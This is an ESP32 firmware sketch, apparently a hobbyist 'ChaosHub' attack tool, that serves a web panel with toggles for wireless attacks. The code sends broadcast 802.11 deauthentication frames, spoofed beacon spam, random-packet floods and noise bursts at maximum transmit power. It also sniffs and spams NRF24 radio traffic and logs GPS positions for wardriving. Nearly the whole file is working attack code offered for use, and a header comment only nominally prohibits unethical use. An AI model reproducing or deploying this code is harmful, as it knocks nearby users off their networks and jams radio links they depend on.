#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include <SPI.h>
#include <RF24.h>
#include <TinyGPS++.h>

//--------------------------------|
// A code created by ViperFSFA    |
// Visit on http://192.168.4.1    |
// Unethical use is Prohibited!!  |
// #Hacktheplanet                 |
//--------------------------------|

#define NRF_CE  4   // NRF24 CE
#define NRF_CSN 5   // NRF24 CSN
#define GPS_TX  16  // GPS TX to ESP32 RX2
#define GPS_RX  17  // GPS RX to ESP32 TX2


const char* ssid = "ESP32ChaosHub";
const char* password = "chaoshub";


WebServer server(80);
RF24 radio(NRF_CE, NRF_CSN);
TinyGPSPlus gps;


String logData = "ChaosHub Online\n";
bool deauthing = false;
bool flooding = false;
bool beaconSpam = false;
bool noiseActive = false;
bool nrfSniffing = false;
bool nrfSpamming = false;
bool gpsWardriving = false;
bool nrfAvailable = false;
bool gpsAvailable = false;


void initRawWiFi() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, password);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(82);
}


uint8_t deauthFrame[] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0x00, 0x00,
  0x07, 0x00
};


uint8_t beaconFrame[] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE,
  0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x01, 0x04,
  0x00, 0x08, 'H', 'E', 'L', 'L', 'S', 'P', 'A', 'M'
};


String getWebUI() {
  String html = "<!DOCTYPE html><html><head><title>ESP32 ChaosHub</title>";
  html += "<style>";
  html += "body { background: #000; color: #ff4444; font-family: 'Courier New', monospace; text-align: center; }";
  html += "h1 { color: #ff0000; text-shadow: 0 0 15px #ff0000; font-size: 2.5em; }";
  html += ".container { max-width: 800px; margin: 20px auto; padding: 20px; background: #1a1a1a; border: 2px solid #ff4444; border-radius: 10px; box-shadow: 0 0 20px #ff0000; }";
  html += ".slider { width: 200px; margin: 10px; -webkit-appearance: none; height: 10px; background: #333; outline: none; border-radius: 5px; }";
  html += ".slider::-webkit-slider-thumb { -webkit-appearance: none; width: 20px; height: 20px; background: #ff0000; border-radius: 50%; cursor: pointer; box-shadow: 0 0 10px #ff0000; }";
  html += "label { display: block; margin: 5px; font-size: 1.1em; }";
  html += "textarea { width: 100%; height: 300px; background: #111; color: #ff4444; border: 1px solid #ff0000; border-radius: 5px; padding: 10px; font-size: 1.1em; }";
  html += "</style></head><body>";
  html += "<div class='container'><h1>ESP32 ChaosHub</h1>";
  html += "<p>WiFi: Deauth " + String(deauthing ? "ON" : "OFF") + " | Flood " + String(flooding ? "ON" : "OFF") + " | Beacons " + String(beaconSpam ? "ON" : "OFF") + " | Noise " + String(noiseActive ? "ON" : "OFF") + "</p>";
  html += "<p>NRF24: Sniff " + String(nrfSniffing ? "ON" : "OFF") + " | Spam " + String(nrfSpamming ? "ON" : "OFF") + " | GPS: Wardrive " + String(gpsWardriving ? "ON" : "OFF") + "</p>";
  html += "<label>Deauth <input type='range' class='slider' min='0' max='1' value='" + String(deauthing) + "' onchange=\"location.href='/deauth?val='+this.value\"></label>";
  html += "<label>Flood <input type='range' class='slider' min='0' max='1' value='" + String(flooding) + "' onchange=\"location.href='/flood?val='+this.value\"></label>";
  html += "<label>Beacons <input type='range' class='slider' min='0' max='1' value='" + String(beaconSpam) + "' onchange=\"location.href='/beacon?val='+this.value\"></label>";
  html += "<label>Noise <input type='range' class='slider' min='0' max='1' value='" + String(noiseActive) + "' onchange=\"location.href='/noise?val='+this.value\"></label>";
  html += "<label>NRF Sniff <input type='range' class='slider' min='0' max='1' value='" + String(nrfSniffing) + "' onchange=\"location.href='/nrf_sniff?val='+this.value\"></label>";
  html += "<label>NRF Spam <input type='range' class='slider' min='0' max='1' value='" + String(nrfSpamming) + "' onchange=\"location.href='/nrf_spam?val='+this.value\"></label>";
  html += "<label>GPS Wardrive (Experimental) <input type='range' class='slider' min='0' max='1' value='" + String(gpsWardriving) + "' onchange=\"location.href='/gps_wardrive?val='+this.value\"></label>";
  html += "<textarea readonly>" + logData + "</textarea>";
  html += "</div></body></html>";
  return html;
}


void setup() {
  Serial.begin(115200);
  Serial2.begin(9600, SERIAL_8N1, GPS_RX, GPS_TX);
  initRawWiFi();
  logData += "IP: " + WiFi.softAPIP().toString() + "\n";


  if (radio.begin()) {
    nrfAvailable = true;
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_250KBPS);
    radio.openReadingPipe(1, 0xF0F0F0F0E1LL);
    radio.openWritingPipe(0xF0F0F0F0E2LL);
    logData += "NRF24 Online\n";
  } else {
    logData += "NRF24 Unavailable\n";
  }


  gpsAvailable = false;


  server.on("/", []() { server.send(200, "text/html", getWebUI()); });
  server.on("/deauth", handleDeauth);
  server.on("/flood", handleFlood);
  server.on("/beacon", handleBeacon);
  server.on("/noise", handleNoise);
  server.on("/nrf_sniff", handleNrfSniff);
  server.on("/nrf_spam", handleNrfSpam);
  server.on("/gps_wardrive", handleGpsWardrive);
  server.begin();
  logData += "WebUI Live\n";
}


void handleDeauth() {
  deauthing = server.arg("val").toInt();
  logData += "Deauth " + String(deauthing ? "Engaged" : "Halted") + "\n";
  server.send(200, "text/html", getWebUI());
}

void handleFlood() {
  flooding = server.arg("val").toInt();
  logData += "Flood " + String(flooding ? "Engaged" : "Halted") + "\n";
  server.send(200, "text/html", getWebUI());
}

void handleBeacon() {
  beaconSpam = server.arg("val").toInt();
  logData += "Beacons " + String(beaconSpam ? "Engaged" : "Halted") + "\n";
  server.send(200, "text/html", getWebUI());
}

void handleNoise() {
  noiseActive = server.arg("val").toInt();
  logData += "Noise " + String(noiseActive ? "Engaged" : "Halted") + "\n";
  server.send(200, "text/html", getWebUI());
}

void handleNrfSniff() {
  nrfSniffing = server.arg("val").toInt();
  if (!nrfAvailable && nrfSniffing) {
    nrfSniffing = false;
    logData += "NRF Sniff Failed: Module Missing\n";
  } else {
    logData += "NRF Sniff " + String(nrfSniffing ? "Engaged" : "Halted") + "\n";
    if (nrfSniffing) radio.startListening();
    else radio.stopListening();
  }
  server.send(200, "text/html", getWebUI());
}

void handleNrfSpam() {
  nrfSpamming = server.arg("val").toInt();
  if (!nrfAvailable && nrfSpamming) {
    nrfSpamming = false;
    logData += "NRF Spam Failed: Module Missing\n";
  } else {
    logData += "NRF Spam " + String(nrfSpamming ? "Engaged" : "Halted") + "\n";
  }
  server.send(200, "text/html", getWebUI());
}

void handleGpsWardrive() {
  gpsWardriving = server.arg("val").toInt();
  if (!gpsAvailable && gpsWardriving) {
    gpsWardriving = false;
    logData += "GPS Wardrive Failed: Module Missing\n";
  } else {
    logData += "GPS Wardrive " + String(gpsWardriving ? "Engaged" : "Halted") + "\n";
  }
  server.send(200, "text/html", getWebUI());
}


void loop() {
  server.handleClient();

 
  if (deauthing) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    logData += "Deauth Blast\n";
    delay(50);
  }
  if (flooding) {
    uint8_t floodPacket[32];
    for (int i = 0; i < 32; i++) floodPacket[i] = random(255);
    esp_wifi_80211_tx(WIFI_IF_AP, floodPacket, sizeof(floodPacket), false);
    logData += "Flood Packet\n";
    delay(10);
  }
  if (beaconSpam) {
    beaconFrame[34] = random(65, 90);
    esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, sizeof(beaconFrame), false);
    logData += "Beacon: HELLSPAM" + String((char)beaconFrame[34]) + "\n";
    delay(100);
  }
  if (noiseActive) {
    uint8_t noisePacket[128];
    for (int i = 0; i < 128; i++) noisePacket[i] = random(255);
    esp_wifi_80211_tx(WIFI_IF_AP, noisePacket, sizeof(noisePacket), false);
    logData += "Noise Burst\n";
    delay(5);
  }


  if (nrfAvailable && nrfSniffing && radio.available()) {
    char rfBuffer[32] = {0};
    radio.read(rfBuffer, sizeof(rfBuffer));
    logData += "NRF Sniffed: " + String(rfBuffer) + "\n";
  }
  if (nrfAvailable && nrfSpamming) {
    radio.stopListening();
    char spam[] = "HELL_X";
    radio.write(spam, sizeof(spam));
    logData += "NRF Spam Sent\n";
    delay(100);
  }

 
  while (Serial2.available()) {
    if (gps.encode(Serial2.read())) {
      gpsAvailable = true;
      if (gpsWardriving && gps.location.isValid()) {
        logData += "Lat: " + String(gps.location.lat(), 6) + ", Lng: " + String(gps.location.lng(), 6) + "\n";
      }
    }
  }


  if (logData.length() > 1000) {
    logData = logData.substring(logData.length() - 900);
  }
}
